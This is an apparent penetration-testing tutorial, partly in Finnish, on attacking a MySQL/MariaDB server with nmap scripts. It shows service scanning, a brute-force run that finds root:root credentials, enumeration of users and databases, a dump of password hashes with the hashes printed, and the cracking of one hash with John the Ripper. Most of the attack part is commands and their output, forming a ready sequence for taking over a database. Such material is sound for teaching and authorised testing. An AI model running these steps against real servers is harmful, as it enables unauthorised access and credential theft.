Listing MySQL databases 
===

MySQL is an open Source for Relational Database Management System that uses structured query language for generating database record.  

Let’s Begin !!!

# Scanning for port 3306

 open the terminal and type following command to check MySQL service is activated on the targeted system or not, basically MySQL service is activated on default port 3306.


```
nmap -sT 192.168.1.216
```
# Retrieve MySQL information

Now type another command to retrieve MySQL information such as version, protocol and etc:

```
nmap --script=mysql-info 192.168.1.216
```
### Example....

```
nmap --script=mysql-info 192.168.10.170
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 11:13 EET
Nmap scan report for 192.168.10.170
Host is up (0.013s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.4-MariaDB-1~deb12u1
|   Thread ID: 145323
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolNew, SupportsTransactions, Speaks41ProtocolOld, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, ODBCClient, LongColumnFlag, SupportsCompression, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: VIM'xLO)}\7:]F(4j:":
|_  Auth Plugin Name: mysql_native_password
5900/tcp open  vnc

Nmap done: 1 IP address (1 host up) scanned in 3.29 seconds
```
Above command try to connect to with MySQL server and hence prints information such as the protocol: 10, version numbers: 5.5.5-10.11.4-MariaDB-1~deb12u1, thread ID: 145323, status: auto-commit, capabilities, and the password salt as shown in given image.

## Brute force attack

┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ nmap -p3306 --script mysql-brute 192.168.10.170

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 08:33 EET
Nmap scan report for 192.168.10.170
Host is up (0.24s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute: 
|   Accounts: 
|     root:root - Valid credentials
|_  Statistics: Performed 45009 guesses in 232 seconds, average tps: 196.6

Nmap done: 1 IP address (1 host up) scanned in 233.17 seconds
                                                                                                                                                   
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ nmap --script=mysql-brute 192.168.10.170

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 08:38 EET
Nmap scan report for 192.168.10.170
Host is up (0.0092s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
3306/tcp open  mysql
| mysql-brute: 
|   Accounts: 
|     root:root - Valid credentials
|_  Statistics: Performed 45009 guesses in 260 seconds, average tps: 176.7
5900/tcp open  vnc

Nmap done: 1 IP address (1 host up) scanned in 263.01 seconds

## Finding root accounts with an empty password in MySQL servers
                                                                                                                            
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ nmap -p3306 --script mysql-empty-password 192.168.10.170 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 08:56 EET
Nmap scan report for 192.168.10.170
Host is up (0.0086s latency).

PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds

## Listing MySQL users

┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ nmap -p3306 --script mysql-users --script-args mysqluser=root,mysqlpass=root 192.168.10.170

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 09:58 EET
Nmap scan report for 192.168.10.170
Host is up (0.0046s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-users: 
|   21Oppilas
|   root
|   mariadb.sys
|   mysql
|_  wpuser

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds

```

# Detecting insecure configurations in MySQL servers

Insecure configurations in databases could be abused by attackers. The Center for Internet Security (CIS) publishes a security benchmark for MySQL, and Nmap can use this benchmark as a base to audit the security configurations of MySQL servers. For more information can be found here: https://www.mysql.com/products/enterprise/cisbenchmark.html

Täältä voi katsoa mysql-cis.audit filen ohjeet:  https://svn.nmap.org/nmap/scripts/mysql-audit.nse


## How to do it...

To detect insecure configurations in MySQL servers, enter the following command:
```
nmap -p 3306 --script mysql-audit --script-args "mysql- audit.username='root', \
-- mysql-audit.password='root',mysql- audit.filename='nselib/data/mysql-cis.audit'"
```

## Retrieve database names

This command will fetch MySQL database name which helps of given argument mysqluser root and mysqlpass root.

```
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ nmap -p3306 192.168.10.170 --script=mysql-databases --script-args mysqluser=root,mysqlpass=root  

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 11:21 EET
Nmap scan report for 192.168.10.170
Host is up (0.12s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-databases: 
|   10Oppilas
|   11Oppilas
|   12Oppilas
|   13Oppilas
|   14Oppilas
|   15Oppilas
|   16Oppilas
|   17Oppilas
|   18Oppilas
|   19Oppilas
|   1Oppilas
|   20Oppilas
|   21Oppilas
|   22Oppilas
|   23Oppilas
|   24Oppilas
|   25Oppilas
|   26Oppilas
|   27Oppilas
|   28Oppilas
|   2Oppilas
|   30Oppilas
|   3Oppilas
|   4Oppilas
|   5Oppilas
|   6Oppilas
|   7Oppilas
|   8Oppilas
|   9Oppilas
|   DigiOs
|   Maila
|   SuperP
|   Vuokatti
|   employee
|   information_schema
|   mikandb
|   mydb
|   mysql
|   news
|   performance_schema
|   saaAsema
|   sys
|   testinews
|_  wpdb

Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
                                                                                                                                                   
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ 
```
## Retrieve Hash Dump

This command will Dumps the password hashes from a MySQL server in a format suitable for cracking by tools such as John the Ripper.

```
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ nmap -p3306 192.168.10.170 --script=mysql-dump-hashes --script-args username=root,password=root

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 11:24 EET
Nmap scan report for 192.168.10.170
Host is up (0.011s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-dump-hashes: 
|   root:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   mysql:invalid
|   wpuser:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
|_  21Oppilas:*C5B1A33B622B93204CBE66EA5D17342D0F2397CF

Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
                                                                                                                                                   
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ 
```
## John the Ripper

```
--Luodaan tiedosto, johon hash salasana kopioidaan

┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ touch hashes.txt   
                                                                                           -- Avataan tiedosto   ja kopioidaan kryptattu salasana                                                
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ nano hashes.txt   
                                                                                           -- Ja john tulille

┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ john hashes.txt                               

Using default input encoding: UTF-8
Loaded 1 password hash (mysql-sha1, MySQL 4.1+ [SHA1 128/128 ASIMD 4x])
Warning: no OpenMP support for this hash type, consider --fork=2
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
root             (?)     
1g 0:00:00:01 DONE 3/3 (2023-12-13 11:36) 0.9708g/s 5464Kp/s 5464Kc/s 5464KC/s roob..rooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                   
┌──(parallels㉿kali-gnu-linux-2023)-[~]
└─$ 
```



